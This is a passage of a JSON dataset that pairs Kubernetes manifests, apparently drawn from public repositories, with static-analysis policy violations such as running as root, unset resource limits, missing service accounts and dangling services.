    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.18\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.18\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"jx-boot-job\" not found"
  },
  {
    "id": "10464",
    "manifest_path": "data/manifests/the_stack_sample/sample_4042.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.18\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.18\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"git-clone\" is not set to runAsNonRoot"
  },
  {
    "id": "10465",
    "manifest_path": "data/manifests/the_stack_sample/sample_4042.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.18\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.18\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"job\" is not set to runAsNonRoot"
  },
  {
    "id": "10466",
    "manifest_path": "data/manifests/the_stack_sample/sample_4042.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.18\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.18\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"git-clone\" has cpu request 0"
  },
  {
    "id": "10467",
    "manifest_path": "data/manifests/the_stack_sample/sample_4042.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.18\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.18\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"job\" has cpu request 0"
  },
  {
    "id": "10468",
    "manifest_path": "data/manifests/the_stack_sample/sample_4042.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.18\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.18\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"git-clone\" has memory limit 0"
  },
  {
    "id": "10469",
    "manifest_path": "data/manifests/the_stack_sample/sample_4042.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.18\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.18\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"job\" has memory limit 0"
  },
  {
    "id": "10470",
    "manifest_path": "data/manifests/the_stack_sample/sample_4043.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: kui-service\n  labels:\n    app: kui\nspec:\n  type: NodePort\n  selector:\n    app: kui\n  ports:\n  - protocol: TCP\n    port: 80\n    nodePort: 31234\n    targetPort: 80\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:kui])"
  },
  {
    "id": "10471",
    "manifest_path": "data/manifests/the_stack_sample/sample_4046.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: curry-ns-statefulset\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: k8s.gcr.io/nginx-slim:0.8\n        ports:\n        - containerPort: 80\n          name: web\n        volumeMounts:\n        - name: www\n          mountPath: /usr/share/nginx/html\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10472",
    "manifest_path": "data/manifests/the_stack_sample/sample_4046.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: curry-ns-statefulset\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: k8s.gcr.io/nginx-slim:0.8\n        ports:\n        - containerPort: 80\n          name: web\n        volumeMounts:\n        - name: www\n          mountPath: /usr/share/nginx/html\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10473",
    "manifest_path": "data/manifests/the_stack_sample/sample_4046.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: curry-ns-statefulset\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: k8s.gcr.io/nginx-slim:0.8\n        ports:\n        - containerPort: 80\n          name: web\n        volumeMounts:\n        - name: www\n          mountPath: /usr/share/nginx/html\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10474",
    "manifest_path": "data/manifests/the_stack_sample/sample_4046.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: curry-ns-statefulset\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: k8s.gcr.io/nginx-slim:0.8\n        ports:\n        - containerPort: 80\n          name: web\n        volumeMounts:\n        - name: www\n          mountPath: /usr/share/nginx/html\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "10475",
    "manifest_path": "data/manifests/the_stack_sample/sample_4046.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: curry-ns-statefulset\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: k8s.gcr.io/nginx-slim:0.8\n        ports:\n        - containerPort: 80\n          name: web\n        volumeMounts:\n        - name: www\n          mountPath: /usr/share/nginx/html\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "10476",
    "manifest_path": "data/manifests/the_stack_sample/sample_4048.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\nspec:\n  containers:\n  - name: test-pod\n    image: busybox:latest\n    command:\n    - /bin/sh\n    args:\n    - -c\n    - touch /mnt/SUCCESS && exit 0 || exit 1\n    volumeMounts:\n    - name: nfs-pvc\n      mountPath: /mnt\n  volumes:\n  - name: nfs-pvc\n    persistentVolumeClaim:\n      claimName: test-claim\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"test-pod\" is using an invalid container image, \"busybox:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10477",
    "manifest_path": "data/manifests/the_stack_sample/sample_4048.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\nspec:\n  containers:\n  - name: test-pod\n    image: busybox:latest\n    command:\n    - /bin/sh\n    args:\n    - -c\n    - touch /mnt/SUCCESS && exit 0 || exit 1\n    volumeMounts:\n    - name: nfs-pvc\n      mountPath: /mnt\n  volumes:\n  - name: nfs-pvc\n    persistentVolumeClaim:\n      claimName: test-claim\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"test-pod\" does not have a read-only root file system"
  },
  {
    "id": "10478",
    "manifest_path": "data/manifests/the_stack_sample/sample_4048.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\nspec:\n  containers:\n  - name: test-pod\n    image: busybox:latest\n    command:\n    - /bin/sh\n    args:\n    - -c\n    - touch /mnt/SUCCESS && exit 0 || exit 1\n    volumeMounts:\n    - name: nfs-pvc\n      mountPath: /mnt\n  volumes:\n  - name: nfs-pvc\n    persistentVolumeClaim:\n      claimName: test-claim\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"test-pod\" is not set to runAsNonRoot"
  },
  {
    "id": "10479",
    "manifest_path": "data/manifests/the_stack_sample/sample_4048.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\nspec:\n  containers:\n  - name: test-pod\n    image: busybox:latest\n    command:\n    - /bin/sh\n    args:\n    - -c\n    - touch /mnt/SUCCESS && exit 0 || exit 1\n    volumeMounts:\n    - name: nfs-pvc\n      mountPath: /mnt\n  volumes:\n  - name: nfs-pvc\n    persistentVolumeClaim:\n      claimName: test-claim\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"test-pod\" has cpu request 0"
  },
  {
    "id": "10480",
    "manifest_path": "data/manifests/the_stack_sample/sample_4048.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\nspec:\n  containers:\n  - name: test-pod\n    image: busybox:latest\n    command:\n    - /bin/sh\n    args:\n    - -c\n    - touch /mnt/SUCCESS && exit 0 || exit 1\n    volumeMounts:\n    - name: nfs-pvc\n      mountPath: /mnt\n  volumes:\n  - name: nfs-pvc\n    persistentVolumeClaim:\n      claimName: test-claim\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"test-pod\" has memory limit 0"
  },
  {
    "id": "10481",
    "manifest_path": "data/manifests/the_stack_sample/sample_4052.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20210427-e4ab4d8c8f\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"crier\" does not have a read-only root file system"
  },
  {
    "id": "10482",
    "manifest_path": "data/manifests/the_stack_sample/sample_4052.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20210427-e4ab4d8c8f\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"crier\" not found"
  },
  {
    "id": "10483",
    "manifest_path": "data/manifests/the_stack_sample/sample_4052.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20210427-e4ab4d8c8f\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"crier\" is not set to runAsNonRoot"
  },
  {
    "id": "10484",
    "manifest_path": "data/manifests/the_stack_sample/sample_4052.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20210427-e4ab4d8c8f\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"crier\" has cpu request 0"
  },
  {
    "id": "10485",
    "manifest_path": "data/manifests/the_stack_sample/sample_4052.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20210427-e4ab4d8c8f\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"crier\" has memory limit 0"
  },
  {
    "id": "10486",
    "manifest_path": "data/manifests/the_stack_sample/sample_4054.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: sower-service\nspec:\n  selector:\n    app: sower\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 8000\n    name: http\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:sower])"
  },
  {
    "id": "10487",
    "manifest_path": "data/manifests/the_stack_sample/sample_4055.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: openshift-authentication-operator\n  name: authentication-operator\n  labels:\n    app: authentication-operator\n  annotations:\n    include.release.openshift.io/self-managed-high-availability: 'true'\n    include.release.openshift.io/single-node-developer: 'true'\n    config.openshift.io/inject-proxy: authentication-operator\n    exclude.release.openshift.io/internal-openshift-hosted: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: authentication-operator\n  template:\n    metadata:\n      name: authentication-operator\n      labels:\n        app: authentication-operator\n    spec:\n      serviceAccountName: authentication-operator\n      containers:\n      - name: authentication-operator\n        image: quay.io/openshift/origin-cluster-authentication-operator:v4.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/bash\n        - -ec\n        args:\n        - \"if [ -s /var/run/configmaps/trusted-ca-bundle/ca-bundle.crt ]; then\\n \\\n          \\   echo \\\"Copying system trust bundle\\\"\\n    cp -f /var/run/configmaps/trusted-ca-bundle/ca-bundle.crt\\\n          \\ /etc/pki/ca-trust/extracted/pem/tls-ca-bundle.pem\\nfi\\nexec authentication-operator\\\n          \\ operator --config=/var/run/configmaps/config/operator-config.yaml --v=2\\\n          \\ --terminate-on-files=/var/run/configmaps/trusted-ca-bundle/ca-bundle.crt\\n\"\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n        securityContext:\n          readOnlyRootFilesystem: false\n        volumeMounts:\n        - mountPath: /var/run/configmaps/config\n          name: config\n        - mountPath: /var/run/secrets/serving-cert\n          name: serving-cert\n        - mountPath: /var/run/configmaps/trusted-ca-bundle\n          name: trusted-ca-bundle\n          readOnly: true\n        - mountPath: /var/run/configmaps/service-ca-bundle\n          name: service-ca-bundle\n          readOnly: true\n        env:\n        - name: IMAGE_OAUTH_SERVER\n          value: quay.io/openshift/origin-oauth-server:v4.2\n        - name: IMAGE_OAUTH_APISERVER\n          value: quay.io/openshift/origin-oauth-apiserver:v4.6\n        - name: OPERATOR_IMAGE_VERSION\n          value: 0.0.1-snapshot\n        - name: OPERAND_OAUTH_SERVER_IMAGE_VERSION\n          value: 0.0.1-snapshot_openshift\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n      volumes:\n      - name: config\n        configMap:\n          defaultMode: 440\n          name: authentication-operator-config\n      - name: trusted-ca-bundle\n        configMap:\n          name: trusted-ca-bundle\n          optional: true\n      - name: serving-cert\n        secret:\n          secretName: serving-cert\n          optional: true\n      - name: service-ca-bundle\n        configMap:\n          name: service-ca-bundle\n          optional: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"authentication-operator\" does not have a read-only root file system"
  },
  {
    "id": "10488",
    "manifest_path": "data/manifests/the_stack_sample/sample_4055.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: openshift-authentication-operator\n  name: authentication-operator\n  labels:\n    app: authentication-operator\n  annotations:\n    include.release.openshift.io/self-managed-high-availability: 'true'\n    include.release.openshift.io/single-node-developer: 'true'\n    config.openshift.io/inject-proxy: authentication-operator\n    exclude.release.openshift.io/internal-openshift-hosted: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: authentication-operator\n  template:\n    metadata:\n      name: authentication-operator\n      labels:\n        app: authentication-operator\n    spec:\n      serviceAccountName: authentication-operator\n      containers:\n      - name: authentication-operator\n        image: quay.io/openshift/origin-cluster-authentication-operator:v4.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/bash\n        - -ec\n        args:\n        - \"if [ -s /var/run/configmaps/trusted-ca-bundle/ca-bundle.crt ]; then\\n \\\n          \\   echo \\\"Copying system trust bundle\\\"\\n    cp -f /var/run/configmaps/trusted-ca-bundle/ca-bundle.crt\\\n          \\ /etc/pki/ca-trust/extracted/pem/tls-ca-bundle.pem\\nfi\\nexec authentication-operator\\\n          \\ operator --config=/var/run/configmaps/config/operator-config.yaml --v=2\\\n          \\ --terminate-on-files=/var/run/configmaps/trusted-ca-bundle/ca-bundle.crt\\n\"\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n        securityContext:\n          readOnlyRootFilesystem: false\n        volumeMounts:\n        - mountPath: /var/run/configmaps/config\n          name: config\n        - mountPath: /var/run/secrets/serving-cert\n          name: serving-cert\n        - mountPath: /var/run/configmaps/trusted-ca-bundle\n          name: trusted-ca-bundle\n          readOnly: true\n        - mountPath: /var/run/configmaps/service-ca-bundle\n          name: service-ca-bundle\n          readOnly: true\n        env:\n        - name: IMAGE_OAUTH_SERVER\n          value: quay.io/openshift/origin-oauth-server:v4.2\n        - name: IMAGE_OAUTH_APISERVER\n          value: quay.io/openshift/origin-oauth-apiserver:v4.6\n        - name: OPERATOR_IMAGE_VERSION\n          value: 0.0.1-snapshot\n        - name: OPERAND_OAUTH_SERVER_IMAGE_VERSION\n          value: 0.0.1-snapshot_openshift\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n      volumes:\n      - name: config\n        configMap:\n          defaultMode: 440\n          name: authentication-operator-config\n      - name: trusted-ca-bundle\n        configMap:\n          name: trusted-ca-bundle\n          optional: true\n      - name: serving-cert\n        secret:\n          secretName: serving-cert\n          optional: true\n      - name: service-ca-bundle\n        configMap:\n          name: service-ca-bundle\n          optional: true\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"authentication-operator\" not found"
  },
  {
    "id": "10489",
    "manifest_path": "data/manifests/the_stack_sample/sample_4055.yaml",
